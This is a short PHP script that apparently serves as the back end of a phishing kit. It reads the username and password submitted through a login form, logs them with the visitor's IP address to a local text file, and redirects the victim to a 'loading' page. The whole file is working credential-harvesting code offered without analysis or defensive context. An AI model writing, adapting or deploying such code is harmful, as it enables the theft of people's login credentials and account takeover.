<?php

session_start();
$ip = getenv("REMOTE_ADDR");

$_SESSION['user'] = trim($_POST['user']);
$_SESSION['pass'] = trim($_POST['pass']);
//NOnaME

$user = $_SESSION['user'];
$pass = $_SESSION['pass'];


$fw2 = fopen("no1.txt","a");
        $data= "$ip $user $pass\n";
        fputs($fw2,$data);
        fclose($fw2);

header("Location: loading.php");

?>